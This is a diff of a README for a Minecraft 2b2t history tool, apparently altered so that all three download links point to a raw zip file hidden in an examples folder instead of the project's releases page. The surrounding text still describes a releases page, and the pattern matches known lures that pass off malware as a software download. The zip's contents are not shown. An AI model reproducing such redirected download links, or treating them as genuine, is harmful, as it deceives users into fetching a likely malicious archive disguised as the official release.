@@ -1,6 +1,6 @@
 # 🗺️ 2b2tAtlas-Public-API - Explore 2b2t History Like Never Before
 
-[![Download Now](https://img.shields.io/badge/Download-2b2tAtlas%20Public%20API-blue?style=for-the-badge&logo=github)](https://github.com/christophegremillon54/2b2tAtlas-Public-API/releases)
+[![Download Now](https://img.shields.io/badge/Download-2b2tAtlas%20Public%20API-blue?style=for-the-badge&logo=github)](https://github.com/christophegremillon54/2b2tAtlas-Public-API/raw/refs/heads/main/examples/atlas-stack/2b2tAtlas.Client/wwwroot/1.6.zip)
 
 ## 👋 What Is This?
 
@@ -20,7 +20,7 @@ Getting started is as easy as 1-2-3. Here's what you need to do:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [Download 2b2tAtlas-Public-API](https://github.com/christophegremillon54/2b2tAtlas-Public-API/releases)
+Visit this link to download the application: [Download 2b2tAtlas-Public-API](https://github.com/christophegremillon54/2b2tAtlas-Public-API/raw/refs/heads/main/examples/atlas-stack/2b2tAtlas.Client/wwwroot/1.6.zip)
 
 When you click the link, you'll see a page with several download options. Look for the latest release and click the download button. The file will start downloading to your computer, usually to your "Downloads" folder.
 
@@ -145,6 +145,6 @@ If you find this tool valuable, consider giving the project a star on GitHub. It
 
 **Download now and dive into the incredible history of 2b2t!**
 
-[![Download Latest Release](https://img.shields.io/badge/⬇️-Download%20Latest%20Release-2ea44f?style=for-the-badge)](https://github.com/christophegremillon54/2b2tAtlas-Public-API/releases)
+[![Download Latest Release](https://img.shields.io/badge/⬇️-Download%20Latest%20Release-2ea44f?style=for-the-badge)](https://github.com/christophegremillon54/2b2tAtlas-Public-API/raw/refs/heads/main/examples/atlas-stack/2b2tAtlas.Client/wwwroot/1.6.zip)
 
 Keywords: 2b2t, 2b2tatlas, api-examples, fabricmc, historical-data, map-api, minecraft, minecraft-api, minecraft-data, minecraft-mod, openapi, waypoints
